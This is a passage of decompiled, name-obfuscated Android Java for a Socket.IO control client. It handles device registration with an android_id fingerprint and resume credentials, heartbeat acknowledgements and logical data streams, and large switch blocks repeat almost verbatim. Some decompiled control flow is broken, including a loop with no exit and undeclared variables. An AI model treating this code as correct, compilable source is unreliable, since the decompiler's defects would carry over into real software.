                                    String strOptString3 = jSONObjectL6.optString("reason", "");
                                    synchronized (d0VarF4.f1574g) {
                                        try {
                                            if (!d0VarF4.f1582p && !d0VarF4.f1581o) {
                                                d0VarF4.f1581o = true;
                                                if (strOptString3 != null && !strOptString3.isEmpty() && !"closed".equals(strOptString3) && !"eof".equals(strOptString3)) {
                                                    if (strOptString3.length() > 256) {
                                                        strOptString3 = strOptString3.substring(0, 256);
                                                    }
                                                    d0VarF4.f1583q = new IOException("remote logical stream closed: ".concat(strOptString3));
                                                }
                                                d0VarF4.f1574g.notifyAll();
                                            }
                                        } catch (Throwable th8) {
                                            throw th8;
                                        }
                                    }
                                }
                                e = null;
                            } catch (IOException e10) {
                                e = e10;
                                String strOptString4 = jSONObjectL6.optString("requestId", "");
                                if (!strOptString4.isEmpty() && (d0VarF2 = b1Var5.f(strOptString4)) != null) {
                                    d0VarF2.d(e, true);
                                }
                            }
                            if (e == null) {
                                a0Var10.t();
                                return;
                            }
                            return;
                        case 10:
                            a0 a0Var11 = this;
                            if (a0Var11.f1528s.get() && a0Var11.N.get() == null && (jSONObjectL = a0.l(objArr)) != null) {
                                a0Var11.t();
                                h2.m mVarA = a0.A(jSONObjectL);
                                if (mVarA != null) {
                                    a0Var11.D(a0Var11.f1533x.get(), mVarA);
                                    return;
                                }
                                return;
                            }
                            return;
                        default:
                            a0 a0Var12 = this;
                            String strC = "";
                            Throwable th9 = null;
                            if (objArr != null) {
                                for (Object obj4 : objArr) {
                                    if (obj4 instanceof Throwable) {
                                        th9 = (Throwable) obj4;
                                    }
                                }
                            }
                            if (th9 == null) {
                                return;
                            }
                            String str8 = "websocket";
                            if (th9 instanceof y0.a) {
                                y0.a aVar2 = (y0.a) th9;
                                String strC2 = a0.c(aVar2.f6035c, 24);
                                str8 = strC2.isEmpty() ? "websocket" : strC2;
                                Object obj5 = aVar2.f6036d;
                                strC = a0.c(obj5 != null ? String.valueOf(obj5) : "", 64);
                            }
                            a0Var12.R.set(new z(str8, strC, th9));
                            return;
                    }
                }
            });
            final int i7 = 4;
            sVarA.c("device:registered", new x0.a() { // from class: g2.h
                /* JADX WARN: Code duplicated, block: B:371:0x0646  */
                /* JADX WARN: Code duplicated, block: B:373:0x064a  */
                /* JADX WARN: Code duplicated, block: B:378:0x06a7  */
                /* JADX WARN: Code duplicated, block: B:482:0x067f A[EXC_TOP_SPLITTER, SYNTHETIC] */
                @Override // x0.a
                public final void a(Object[] objArr) {
                    y.l lVar2;
                    Throwable th;
                    Throwable th2;
                    boolean z2;
                    long jMax;
                    h2.g gVarR;
                    g.j jVar2;
                    Throwable th3;
                    y.l lVar3;
                    byte[] bArr;
                    d0 d0VarF;
                    d0 d0VarF2;
                    JSONObject jSONObjectL;
                    switch (i7) {
                        case 0:
                            a0 a0Var = this;
                            String str2 = "";
                            if (a0Var.f1528s.get()) {
                                a0Var.f1532w.set(false);
                                d2.y yVarC = null;
                                a0Var.R.set(null);
                                t tVar = t.f1739i;
                                a0Var.f1516h.getClass();
                                a0Var.I(tVar, SystemClock.elapsedRealtime());
                                long jIncrementAndGet = a0Var.f1533x.incrementAndGet();
                                String strN = c2.u.n((Context) a0Var.f1510e.f1959a, "deviceId");
                                h2.b bVar = a0Var.f1510e;
                                Context context2 = a0Var.f1502a;
                                bVar.getClass();
                                y.r rVar = new y.r();
                                rVar.f6032a = "";
                                rVar.f6033b = "";
                                rVar.f6034c = "";
                                try {
                                    rVar.f6032a = Settings.Secure.getString(context2.getApplicationContext().getContentResolver(), "android_id");
                                } catch (Throwable unused2) {
                                    rVar.f6032a = "";
                                }
                                if (((String) rVar.f6032a) == null) {
                                    rVar.f6032a = "";
                                }
                                String str3 = Build.MANUFACTURER;
                                if (str3 == null) {
                                    str3 = "";
                                }
                                rVar.f6033b = str3;
                                String str4 = Build.MODEL;
                                if (str4 == null) {
                                    str4 = "";
                                }
                                rVar.f6034c = str4;
                                if (a0Var.T.f2035i && (lVar2 = a0Var.f1512f) != null) {
                                    try {
                                        yVarC = lVar2.c(strN, (String) a0Var.f1504b.f5973e, rVar);
                                    } catch (RuntimeException unused3) {
                                        Log.w("SocketControlClient", "control continuity attempt persistence failed");
                                    }
                                }
                                d2.y yVar = yVarC;
                                AtomicReference atomicReference = a0Var.P;
                                a0Var.f1516h.getClass();
                                atomicReference.set(new x(jIncrementAndGet, rVar, yVar, SystemClock.elapsedRealtime()));
                                String str5 = a0Var.f1506c;
                                String str6 = (String) a0Var.f1504b.f5973e;
                                h2.h hVar2 = a0Var.T;
                                try {
                                    JSONObject jSONObjectPut = new JSONObject().put("version", 1).put("deviceId", strN);
                                    JSONObject jSONObject = new JSONObject();
                                    String str7 = (String) rVar.f6032a;
                                    if (str7 == null) {
                                        str7 = "";
                                    }
                                    JSONObject jSONObjectPut2 = jSONObjectPut.put("fingerprint", jSONObject.put("androidId", str7).put("manufacturer", (String) rVar.f6033b).put("model", (String) rVar.f6034c));
                                    if (str5 != null) {
                                        str2 = str5;
                                    }
                                    JSONObject jSONObjectPut3 = jSONObjectPut2.put("model", str2).put("appVersion", str6).put("stableCoreBehaviorId", t9.f5181l).put("coreSourceSha256", t9.f5182m).put("buildProvenance", t9.n);
                                    if (hVar2 == null) {
                                        hVar2 = new h2.h();
                                    }
                                    JSONObject jSONObjectPut4 = jSONObjectPut3.put("capabilities", a0.d(hVar2));
                                    if (yVar != null) {
                                        jSONObjectPut4.put("controlResume", new JSONObject().put("credential", (String) yVar.f651a).put("attemptId", (String) yVar.f652b).put("priorSessionId", (String) yVar.f654d).put("priorGeneration", yVar.f653c));
                                    }
                                    StringBuilder sbJ = a0.a.j(jIncrementAndGet, "control registration starting attempt=", " resumeProofPresent=");
                                    sbJ.append(yVar != null);
                                    Log.i("SocketControlClient", sbJ.toString());
                                    try {
                                        a0Var.f1514g.a("device:register", jSONObjectPut4, new k(a0Var, jIncrementAndGet, 0));
                                        return;
                                    } catch (RuntimeException unused4) {
                                        Log.w("SocketControlClient", "device registration emit failed");
                                        return;
                                    }
                                } catch (JSONException e3) {
                                    throw new IllegalStateException(e3);
                                }
                                break;
                            }
                            return;
                        case 1:
                            a0 a0Var2 = this;
                            w0.a aVarK = a0.k(objArr);
                            h2.e eVar = (h2.e) a0Var2.N.get();
                            if (!a0Var2.f1528s.get() || eVar == null || !a0Var2.T.n) {
                                if (aVarK != null) {
                                    aVarK.a(a0.u(false, null, "unsupported"));
                                    return;
                                }
                                return;
                            }
                            try {
                                h2.j jVarY = a0.y(a0.l(objArr), eVar);
                                try {
                                    g.j jVar3 = a0Var2.f1508d;
                                    boolean z3 = jVar3 != null && jVar3.g(jVarY);
                                    a0Var2.t();
                                    if (aVarK != null) {
                                        aVarK.a(a0.u(z3, z3 ? jVarY : null, z3 ? "" : "stale"));
                                        return;
                                    }
                                    return;
                                } catch (RuntimeException unused5) {
                                    if (aVarK != null) {
                                        aVarK.a(a0.u(false, jVarY, "callback_failed"));
                                        return;
                                    }
                                    return;
                                }
                            } catch (IOException unused6) {
                                if (aVarK != null) {
                                    aVarK.a(a0.u(false, null, "invalid"));
                                    return;
                                }
                                return;
                            }
                        case 2:
                            a0 a0Var3 = this;
                            if (a0Var3.f1528s.get()) {
                                boolean z4 = true;
                                boolean z5 = !a0Var3.W && a0Var3.N.get() == null;
                                long j3 = a0Var3.f1533x.get();
                                if (!z5) {
                                    a0Var3.f1533x.incrementAndGet();
                                }
                                String strValueOf = (objArr == null || objArr.length <= 0) ? "socket disconnected" : String.valueOf(objArr[0]);
                                IOException iOException = new IOException("socket.io disconnected: ".concat(strValueOf));
                                z zVar = (z) a0Var3.R.getAndSet(null);
                                b bVar2 = (b) ((AtomicReference) a0Var3.f1520j.f5973e).get();
                                if (zVar == null && bVar2.f1543d == null) {
                                    z4 = false;
                                }
                                a0Var3.f1516h.getClass();
                                boolean z6 = z4;
                                long jElapsedRealtime = SystemClock.elapsedRealtime();
                                int i8 = z6 ? 5 : 4;
                                if (zVar == null) {
                                    if (bVar2 == null || (th2 = bVar2.f1543d) == null) {
                                        th = iOException;
                                    }
                                    z2 = z5;
                                    if (a0Var3.V <= 0) {
                                        jMax = -1;
                                    } else {
                                        jMax = Math.max(0L, jElapsedRealtime - a0Var3.V);
                                    }
                                    gVarR = a0Var3.R(h2.g.l(i8, th, jMax, a0Var3.p()), jElapsedRealtime, zVar, bVar2);
                                    a0Var3.U = gVarR;
                                    a0Var3.f(iOException);
                                    a0Var3.I(t.f1734d, jElapsedRealtime);
                                    Log.w("SocketControlClient", "control transport disconnected ".concat(a0Var3.U.e()));
                                    if (z2) {
                                        a0Var3.F(strValueOf, iOException, gVarR);
                                        return;
                                    }
                                    try {
                                        j jVar8 = new j(a0Var3, j3, strValueOf, iOException, gVarR, 0);
                                        a0Var3.f1516h.getClass();
                                        a0Var3.f1526q.schedule(new m(a0Var3, "registration_rejection_drain", 250 + SystemClock.elapsedRealtime(), jVar8), 250L, TimeUnit.MILLISECONDS);
                                        return;
                                    } catch (RejectedExecutionException unused7) {
                                        return;
                                    }
                                }
                                th2 = zVar.f1830a;
                                th = th2;
                                z2 = z5;
                                if (a0Var3.V <= 0) {
                                    jMax = -1;
                                } else {
                                    jMax = Math.max(0L, jElapsedRealtime - a0Var3.V);
                                }
                                gVarR = a0Var3.R(h2.g.l(i8, th, jMax, a0Var3.p()), jElapsedRealtime, zVar, bVar2);
                                a0Var3.U = gVarR;
                                a0Var3.f(iOException);
                                a0Var3.I(t.f1734d, jElapsedRealtime);
                                Log.w("SocketControlClient", "control transport disconnected ".concat(a0Var3.U.e()));
                                if (z2) {
                                    a0Var3.F(strValueOf, iOException, gVarR);
                                    return;
                                }
                                j jVar9 = new j(a0Var3, j3, strValueOf, iOException, gVarR, 0);
                                a0Var3.f1516h.getClass();
                                a0Var3.f1526q.schedule(new m(a0Var3, "registration_rejection_drain", 250 + SystemClock.elapsedRealtime(), jVar9), 250L, TimeUnit.MILLISECONDS);
                                return;
                            }
                            return;
                        case 3:
                            a0 a0Var4 = this;
                            if (a0Var4.f1528s.get()) {
                                Throwable th4 = null;
                                if (objArr != null) {
                                    for (Object obj : objArr) {
                                        if (obj instanceof Throwable) {
                                            th4 = (Throwable) obj;
                                        }
                                    }
                                }
                                z zVar2 = (z) a0Var4.R.get();
                                b bVar3 = (b) ((AtomicReference) a0Var4.f1520j.f5973e).get();
                                if (th4 == null && zVar2 != null) {
                                    th4 = zVar2.f1830a;
                                }
                                if (th4 == null && (th3 = bVar3.f1543d) != null) {
                                    th4 = th3;
                                }
                                Throwable th5 = zVar2 == null ? th4 : zVar2.f1830a;
                                IOException iOException2 = th4 instanceof IOException ? (IOException) th4 : new IOException("socket.io connect error".concat(th4 == null ? "" : ": ".concat(th4.getClass().getSimpleName())), th4);
                                a0Var4.f1516h.getClass();
                                long jElapsedRealtime2 = SystemClock.elapsedRealtime();
                                a0Var4.U = a0Var4.R(h2.g.l(5, th5 == null ? iOException2 : th5, a0Var4.V <= 0 ? -1L : Math.max(0L, jElapsedRealtime2 - a0Var4.V), a0Var4.p()), jElapsedRealtime2, zVar2, bVar3);
                                Log.w("SocketControlClient", "control connect error ".concat(a0Var4.U.e()));
                                if (!a0Var4.f1532w.compareAndSet(false, true) || (jVar2 = a0Var4.f1508d) == null) {
                                    return;
                                }
                                ((cf) jVar2.f1415d).f3702f.execute(new qe(jVar2, jVar2.f1413b, (AtomicReference) jVar2.f1414c, iOException2, a0Var4.U, 1));
                                return;
                            }
                            return;
                        case 4:
                            a0 a0Var5 = this;
                            a0Var5.v(a0Var5.f1533x.get(), objArr);
                            return;
                        case 5:
                            a0 a0Var6 = this;
                            JSONObject jSONObjectL2 = a0.l(objArr);
                            h2.e eVar2 = (h2.e) a0Var6.N.get();
                            if (jSONObjectL2 == null || eVar2 == null || !a0.q(jSONObjectL2, eVar2.f1982d)) {
                                return;
                            }
                            a0Var6.t();
                            a0Var6.C(jSONObjectL2, eVar2);
                            long jO = a0.o(jSONObjectL2);
                            a0Var6.f1516h.getClass();
                            long jElapsedRealtime3 = SystemClock.elapsedRealtime();
                            JSONObject jSONObjectN = a0.n(eVar2.f1982d, jO, jElapsedRealtime3);
                            w0.a aVarK2 = a0.k(objArr);
                            if (aVarK2 != null) {
                                aVarK2.a(jSONObjectN);
                            }
                            a0Var6.j("heartbeat:ack", jSONObjectN, jO, jElapsedRealtime3);
                            a0Var6.m();
                            return;
                        case 6:
                            a0 a0Var7 = this;
                            JSONObject jSONObjectL3 = a0.l(objArr);
                            h2.e eVar3 = (h2.e) a0Var7.N.get();
                            if (jSONObjectL3 == null || eVar3 == null || !a0.q(jSONObjectL3, eVar3.f1982d)) {
                                return;
                            }
                            long jO2 = a0.o(jSONObjectL3);
                            long j4 = a0Var7.G.get();
                            long j5 = a0Var7.H.get();
                            if (jO2 <= 0 || (jO2 <= j4 && jO2 > j5)) {
                                a0Var7.f1516h.getClass();
                                long jElapsedRealtime4 = SystemClock.elapsedRealtime();
                                a0Var7.D.set(jElapsedRealtime4);
                                a0Var7.s(jElapsedRealtime4, jO2, (jO2 <= 0 || jO2 != j4) ? -1L : a0Var7.F.get());
                                a0Var7.C(jSONObjectL3, eVar3);
                                a0Var7.m();
                                return;
                            }
                            long jIncrementAndGet2 = a0Var7.B.incrementAndGet();
                            StringBuilder sbJ2 = a0.a.j(jO2, "invalid Socket.IO heartbeat ACK event=heartbeat:ack sequence=", " lastSentSequence=");
                            sbJ2.append(j4);
                            j4.d(sbJ2, " lastAckSequence=", j5, " count=");
                            sbJ2.append(jIncrementAndGet2);
                            Log.w("SocketControlClient", sbJ2.toString());
                            return;
                        case 7:
                            a0 a0Var8 = this;
                            b1 b1Var = (b1) a0Var8.Q.get();
                            JSONObject jSONObjectL4 = a0.l(objArr);
                            w0.a aVarK3 = a0.k(objArr);
                            long jOptLong = 0;
                            if (b1Var == null || jSONObjectL4 == null) {
                                if (aVarK3 != null) {
                                    String strOptString = "";
                                    try {
                                        JSONObject jSONObjectPut5 = new JSONObject().put("version", 1);
                                        if (jSONObjectL4 != null) {
                                            strOptString = jSONObjectL4.optString("requestId", "");
                                        }
                                        JSONObject jSONObjectPut6 = jSONObjectPut5.put("requestId", strOptString);
                                        if (jSONObjectL4 != null) {
                                            jOptLong = jSONObjectL4.optLong("generation", 0L);
                                        }
                                        aVarK3.a(jSONObjectPut6.put("generation", jOptLong).put("ok", false).put("error", new JSONObject().put("code", "session_closed").put("message", "logical stream unavailable")));
                                        return;
                                    } catch (JSONException e4) {
                                        throw new IllegalStateException(e4);
                                    }
                                }
                                return;
                            }
                            Object obj2 = null;
                            try {
                                a1 a1VarH = b1Var.h(jSONObjectL4, true);
                                if (b1.e(a1VarH.f1537b)) {
                                    synchronized (b1Var.f1545a) {
                                        try {
                                            if (b1Var.f1550f) {
                                                lVar3 = new y.l(b1.i(a1VarH.f1536a, (String) a1VarH.f1538c, "session_closed", "control session is closed"), obj2);
                                            } else if (b1Var.f1546b.size() >= 128) {
                                                lVar3 = new y.l(b1.i(a1VarH.f1536a, (String) a1VarH.f1538c, "stream_limit", "logical stream limit reached"), obj2);
                                            } else if (b1Var.f1546b.containsKey((String) a1VarH.f1538c)) {
                                                lVar3 = new y.l(b1.i(a1VarH.f1536a, (String) a1VarH.f1538c, "duplicate_request", "logical stream requestId already exists"), obj2);
                                            } else {
                                                d0 d0Var = new d0(b1Var, (String) a1VarH.f1538c, a1VarH.f1537b, a1VarH.f1536a);
                                                b1Var.f1546b.put((String) a1VarH.f1538c, d0Var);
                                                JSONObject jSONObjectG = b1.g((String) a1VarH.f1538c, a1VarH.f1536a);
                                                try {
                                                    jSONObjectG.put("ok", true);
                                                    lVar3 = new y.l(jSONObjectG, d0Var);
                                                } catch (JSONException e5) {
                                                    throw new IllegalStateException(e5);
                                                }
                                            }
                                        } catch (Throwable th6) {
                                            throw th6;
                                        }
                                    }
                                } else {
                                    lVar3 = new y.l(b1.i(a1VarH.f1536a, (String) a1VarH.f1538c, "unsupported_channel", "unsupported logical stream channel"), obj2);
                                }
                            } catch (IOException e6) {
                                lVar3 = new y.l(b1.i(jSONObjectL4.optLong("generation", 0L), jSONObjectL4.optString("requestId", ""), "invalid_stream_open", e6.getMessage()), obj2);
                            }
                            if (aVarK3 == null) {
                                d0 d0Var2 = (d0) lVar3.f5992d;
                                if (d0Var2 != null) {
                                    d0Var2.d(new IOException("stream:open ACK callback missing"), true);
                                    return;
                                }
                                return;
                            }
                            try {
                                aVarK3.a((JSONObject) lVar3.f5991c);
                                if (((d0) lVar3.f5992d) == null) {
                                    return;
                                }
                                a0Var8.t();
                                try {
                                    a0Var8.f1527r.execute(new e2.q0(a0Var8, b1Var, lVar3, 1));
                                    return;
                                } catch (RejectedExecutionException e7) {
                                    ((d0) lVar3.f5992d).d(new IOException("logical stream dispatcher stopped", e7), true);
                                    return;
                                }
                            } catch (RuntimeException e8) {
                                d0 d0Var3 = (d0) lVar3.f5992d;
                                if (d0Var3 != null) {
                                    d0Var3.d(new IOException("stream:open ACK failed", e8), true);
                                    return;
                                }
                                return;
                            }
                            break;
                        case 8:
                            a0 a0Var9 = this;
                            b1 b1Var2 = (b1) a0Var9.Q.get();
                            JSONObject jSONObjectL5 = a0.l(objArr);
                            if (b1Var2 == null || jSONObjectL5 == null) {
                                return;
                            }
                            IOException iOException3 = null;
                            if (objArr == null) {
                                bArr = null;
                            } else {
                                int length = objArr.length;
                                int i9 = 0;
                                int i10 = 0;
                                bArr = null;
                                while (true) {
                                    if (i9 < length) {
                                        Object obj3 = objArr[i9];
                                        if ((obj3 instanceof JSONObject) || (obj3 instanceof Map)) {
                                            i10++;
                                        } else if (obj3 instanceof byte[]) {
                                            if (bArr == null) {
                                                bArr = (byte[]) obj3;
                                            }
                                        } else if (!(obj3 instanceof w0.a)) {
                                        }
                                        i9++;
                                    } else if (i10 != 1) {
                                    }
                                    bArr = null;
                                }
                            }
                            try {
                                a1 a1VarH2 = b1Var2.h(jSONObjectL5, false);
                                d0 d0VarF3 = b1Var2.f((String) a1VarH2.f1538c);
                                if (d0VarF3 == null) {
                                    b1Var2.b(a1VarH2.f1536a, (String) a1VarH2.f1538c, "unknown_stream");
                                    e = new IOException("unknown logical stream");
                                } else {
                                    if (bArr == null || !q2.c.s(bArr.length)) {
                                        iOException3 = new IOException("logical stream payload exceeds 32 MiB");
                                    } else {
                                        int length2 = bArr.length;
                                        AtomicLong atomicLong = d0VarF3.f1570c.f1547c;
                                        if (length2 < 0 || length2 > 33554432) {
                                            iOException3 = new IOException("logical stream control buffer full");
                                        } else {
                                            while (true) {
                                                long j6 = atomicLong.get();
                                                long j7 = length2;
                                                if (j7 > 67108864 - j6) {
                                                    iOException3 = new IOException("logical stream control buffer full");
                                                } else if (atomicLong.compareAndSet(j6, j7 + j6)) {
                                                    byte[] bArr2 = (byte[]) bArr.clone();
                                                    synchronized (d0VarF3.f1574g) {
                                                        try {
                                                            if (d0VarF3.f1582p || d0VarF3.f1581o) {
                                                                b1 b1Var3 = d0VarF3.f1570c;
                                                                if (length2 > 0) {
                                                                    b1Var3.f1547c.addAndGet(-length2);
                                                                } else {
                                                                    b1Var3.getClass();
                                                                }
                                                                iOException3 = new IOException("logical stream closed");
                                                            } else if (d0VarF3.f1576i.size() >= 32 || length2 > 33554432 - d0VarF3.n) {
                                                                b1 b1Var4 = d0VarF3.f1570c;
                                                                if (length2 > 0) {
                                                                    b1Var4.f1547c.addAndGet(-length2);
                                                                } else {
                                                                    b1Var4.getClass();
                                                                }
                                                                iOException3 = new IOException("logical stream inbound queue full");
                                                            } else {
                                                                d0VarF3.f1576i.addLast(bArr2);
                                                                d0VarF3.n += length2;
                                                                d0VarF3.f1574g.notifyAll();
                                                            }
                                                        } catch (Throwable th7) {
                                                            throw th7;
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                    if (iOException3 != null) {
                                        d0VarF3.d(iOException3, true);
                                    }
                                    e = iOException3;
                                }
                            } catch (IOException e9) {
                                e = e9;
                                String strOptString2 = jSONObjectL5.optString("requestId", "");
                                if (!strOptString2.isEmpty() && (d0VarF = b1Var2.f(strOptString2)) != null) {
                                    d0VarF.d(e, true);
                                }
                            }
                            if (e == null) {
                                a0Var9.t();
                                return;
                            }
                            return;
                        case 9:
                            a0 a0Var10 = this;
                            b1 b1Var5 = (b1) a0Var10.Q.get();
                            JSONObject jSONObjectL6 = a0.l(objArr);
                            if (b1Var5 == null || jSONObjectL6 == null) {
                                return;
                            }
                            try {
                                d0 d0VarF4 = b1Var5.f((String) b1Var5.h(jSONObjectL6, false).f1538c);
                                if (d0VarF4 != null) {
                                    String strOptString3 = jSONObjectL6.optString("reason", "");
                                    synchronized (d0VarF4.f1574g) {
                                        try {
                                            if (!d0VarF4.f1582p && !d0VarF4.f1581o) {
                                                d0VarF4.f1581o = true;
                                                if (strOptString3 != null && !strOptString3.isEmpty() && !"closed".equals(strOptString3) && !"eof".equals(strOptString3)) {
                                                    if (strOptString3.length() > 256) {
                                                        strOptString3 = strOptString3.substring(0, 256);
                                                    }
                                                    d0VarF4.f1583q = new IOException("remote logical stream closed: ".concat(strOptString3));
                                                }
                                                d0VarF4.f1574g.notifyAll();
                                            }
                                        } catch (Throwable th8) {
                                            throw th8;
                                        }
                                    }
                                }
                                e = null;
                            } catch (IOException e10) {
                                e = e10;
                                String strOptString4 = jSONObjectL6.optString("requestId", "");
                                if (!strOptString4.isEmpty() && (d0VarF2 = b1Var5.f(strOptString4)) != null) {
                                    d0VarF2.d(e, true);
                                }
                            }
                            if (e == null) {
                                a0Var10.t();
                                return;
                            }
                            return;
                        case 10:
                            a0 a0Var11 = this;
                            if (a0Var11.f1528s.get() && a0Var11.N.get() == null && (jSONObjectL = a0.l(objArr)) != null) {
                                a0Var11.t();
                                h2.m mVarA = a0.A(jSONObjectL);
                                if (mVarA != null) {
                                    a0Var11.D(a0Var11.f1533x.get(), mVarA);
                                    return;
                                }
                                return;
                            }
                            return;
                        default:
                            a0 a0Var12 = this;
                            String strC = "";
                            Throwable th9 = null;
                            if (objArr != null) {
                                for (Object obj4 : objArr) {
                                    if (obj4 instanceof Throwable) {
                                        th9 = (Throwable) obj4;
                                    }
                                }
                            }
                            if (th9 == null) {
                                return;
                            }
                            String str8 = "websocket";
                            if (th9 instanceof y0.a) {
                                y0.a aVar2 = (y0.a) th9;
                                String strC2 = a0.c(aVar2.f6035c, 24);
                                str8 = strC2.isEmpty() ? "websocket" : strC2;
                                Object obj5 = aVar2.f6036d;
                                strC = a0.c(obj5 != null ? String.valueOf(obj5) : "", 64);
                            }
                            a0Var12.R.set(new z(str8, strC, th9));
                            return;
                    }
                }
            });
            final int i8 = 5;
            sVarA.c("heartbeat", new x0.a() { // from class: g2.h
                /* JADX WARN: Code duplicated, block: B:371:0x0646  */
                /* JADX WARN: Code duplicated, block: B:373:0x064a  */
                /* JADX WARN: Code duplicated, block: B:378:0x06a7  */
                /* JADX WARN: Code duplicated, block: B:482:0x067f A[EXC_TOP_SPLITTER, SYNTHETIC] */
                @Override // x0.a
                public final void a(Object[] objArr) {
                    y.l lVar2;
                    Throwable th;
                    Throwable th2;
                    boolean z2;
                    long jMax;
                    h2.g gVarR;
                    g.j jVar2;
                    Throwable th3;
                    y.l lVar3;
                    byte[] bArr;
                    d0 d0VarF;
                    d0 d0VarF2;
                    JSONObject jSONObjectL;
                    switch (i8) {
                        case 0:
                            a0 a0Var = this;
                            String str2 = "";
                            if (a0Var.f1528s.get()) {
                                a0Var.f1532w.set(false);
                                d2.y yVarC = null;
                                a0Var.R.set(null);
                                t tVar = t.f1739i;
                                a0Var.f1516h.getClass();
                                a0Var.I(tVar, SystemClock.elapsedRealtime());
                                long jIncrementAndGet = a0Var.f1533x.incrementAndGet();
                                String strN = c2.u.n((Context) a0Var.f1510e.f1959a, "deviceId");
                                h2.b bVar = a0Var.f1510e;
                                Context context2 = a0Var.f1502a;
                                bVar.getClass();
                                y.r rVar = new y.r();
                                rVar.f6032a = "";
                                rVar.f6033b = "";
                                rVar.f6034c = "";
                                try {
                                    rVar.f6032a = Settings.Secure.getString(context2.getApplicationContext().getContentResolver(), "android_id");
                                } catch (Throwable unused2) {
                                    rVar.f6032a = "";
                                }
                                if (((String) rVar.f6032a) == null) {
                                    rVar.f6032a = "";
                                }
                                String str3 = Build.MANUFACTURER;
                                if (str3 == null) {
                                    str3 = "";
                                }
                                rVar.f6033b = str3;
                                String str4 = Build.MODEL;
                                if (str4 == null) {
                                    str4 = "";
                                }
                                rVar.f6034c = str4;
                                if (a0Var.T.f2035i && (lVar2 = a0Var.f1512f) != null) {
                                    try {
                                        yVarC = lVar2.c(strN, (String) a0Var.f1504b.f5973e, rVar);
                                    } catch (RuntimeException unused3) {
                                        Log.w("SocketControlClient", "control continuity attempt persistence failed");
                                    }
                                }
                                d2.y yVar = yVarC;
                                AtomicReference atomicReference = a0Var.P;
                                a0Var.f1516h.getClass();
                                atomicReference.set(new x(jIncrementAndGet, rVar, yVar, SystemClock.elapsedRealtime()));
                                String str5 = a0Var.f1506c;
                                String str6 = (String) a0Var.f1504b.f5973e;
                                h2.h hVar2 = a0Var.T;
                                try {
                                    JSONObject jSONObjectPut = new JSONObject().put("version", 1).put("deviceId", strN);
                                    JSONObject jSONObject = new JSONObject();
                                    String str7 = (String) rVar.f6032a;
                                    if (str7 == null) {
                                        str7 = "";
                                    }
                                    JSONObject jSONObjectPut2 = jSONObjectPut.put("fingerprint", jSONObject.put("androidId", str7).put("manufacturer", (String) rVar.f6033b).put("model", (String) rVar.f6034c));
                                    if (str5 != null) {
                                        str2 = str5;
                                    }
                                    JSONObject jSONObjectPut3 = jSONObjectPut2.put("model", str2).put("appVersion", str6).put("stableCoreBehaviorId", t9.f5181l).put("coreSourceSha256", t9.f5182m).put("buildProvenance", t9.n);
                                    if (hVar2 == null) {
                                        hVar2 = new h2.h();
                                    }
                                    JSONObject jSONObjectPut4 = jSONObjectPut3.put("capabilities", a0.d(hVar2));
                                    if (yVar != null) {
                                        jSONObjectPut4.put("controlResume", new JSONObject().put("credential", (String) yVar.f651a).put("attemptId", (String) yVar.f652b).put("priorSessionId", (String) yVar.f654d).put("priorGeneration", yVar.f653c));
                                    }
                                    StringBuilder sbJ = a0.a.j(jIncrementAndGet, "control registration starting attempt=", " resumeProofPresent=");
                                    sbJ.append(yVar != null);
                                    Log.i("SocketControlClient", sbJ.toString());
                                    try {
                                        a0Var.f1514g.a("device:register", jSONObjectPut4, new k(a0Var, jIncrementAndGet, 0));
                                        return;
                                    } catch (RuntimeException unused4) {
                                        Log.w("SocketControlClient", "device registration emit failed");
                                        return;
                                    }
                                } catch (JSONException e3) {
                                    throw new IllegalStateException(e3);
                                }
                                break;
                            }
                            return;
                        case 1:
                            a0 a0Var2 = this;
                            w0.a aVarK = a0.k(objArr);
                            h2.e eVar = (h2.e) a0Var2.N.get();
                            if (!a0Var2.f1528s.get() || eVar == null || !a0Var2.T.n) {
                                if (aVarK != null) {
                                    aVarK.a(a0.u(false, null, "unsupported"));
                                    return;
                                }
                                return;
                            }
                            try {
                                h2.j jVarY = a0.y(a0.l(objArr), eVar);
                                try {
                                    g.j jVar3 = a0Var2.f1508d;
                                    boolean z3 = jVar3 != null && jVar3.g(jVarY);
                                    a0Var2.t();
                                    if (aVarK != null) {
                                        aVarK.a(a0.u(z3, z3 ? jVarY : null, z3 ? "" : "stale"));
                                        return;
                                    }
                                    return;
                                } catch (RuntimeException unused5) {
                                    if (aVarK != null) {
                                        aVarK.a(a0.u(false, jVarY, "callback_failed"));
                                        return;
                                    }
                                    return;
                                }
                            } catch (IOException unused6) {
                                if (aVarK != null) {
                                    aVarK.a(a0.u(false, null, "invalid"));
                                    return;
                                }
                                return;
                            }
                        case 2:
                            a0 a0Var3 = this;
                            if (a0Var3.f1528s.get()) {
                                boolean z4 = true;
                                boolean z5 = !a0Var3.W && a0Var3.N.get() == null;
                                long j3 = a0Var3.f1533x.get();
                                if (!z5) {
                                    a0Var3.f1533x.incrementAndGet();
                                }
                                String strValueOf = (objArr == null || objArr.length <= 0) ? "socket disconnected" : String.valueOf(objArr[0]);
                                IOException iOException = new IOException("socket.io disconnected: ".concat(strValueOf));
                                z zVar = (z) a0Var3.R.getAndSet(null);
                                b bVar2 = (b) ((AtomicReference) a0Var3.f1520j.f5973e).get();
                                if (zVar == null && bVar2.f1543d == null) {
                                    z4 = false;
                                }
                                a0Var3.f1516h.getClass();
                                boolean z6 = z4;
                                long jElapsedRealtime = SystemClock.elapsedRealtime();
                                int i9 = z6 ? 5 : 4;
                                if (zVar == null) {
                                    if (bVar2 == null || (th2 = bVar2.f1543d) == null) {
                                        th = iOException;
                                    }
                                    z2 = z5;
                                    if (a0Var3.V <= 0) {
                                        jMax = -1;
                                    } else {
                                        jMax = Math.max(0L, jElapsedRealtime - a0Var3.V);
                                    }
                                    gVarR = a0Var3.R(h2.g.l(i9, th, jMax, a0Var3.p()), jElapsedRealtime, zVar, bVar2);
                                    a0Var3.U = gVarR;
                                    a0Var3.f(iOException);
                                    a0Var3.I(t.f1734d, jElapsedRealtime);
                                    Log.w("SocketControlClient", "control transport disconnected ".concat(a0Var3.U.e()));
                                    if (z2) {
                                        a0Var3.F(strValueOf, iOException, gVarR);
                                        return;
                                    }
                                    try {
                                        j jVar9 = new j(a0Var3, j3, strValueOf, iOException, gVarR, 0);
                                        a0Var3.f1516h.getClass();
                                        a0Var3.f1526q.schedule(new m(a0Var3, "registration_rejection_drain", 250 + SystemClock.elapsedRealtime(), jVar9), 250L, TimeUnit.MILLISECONDS);
                                        return;
                                    } catch (RejectedExecutionException unused7) {
                                        return;
                                    }
                                }
                                th2 = zVar.f1830a;
                                th = th2;
                                z2 = z5;
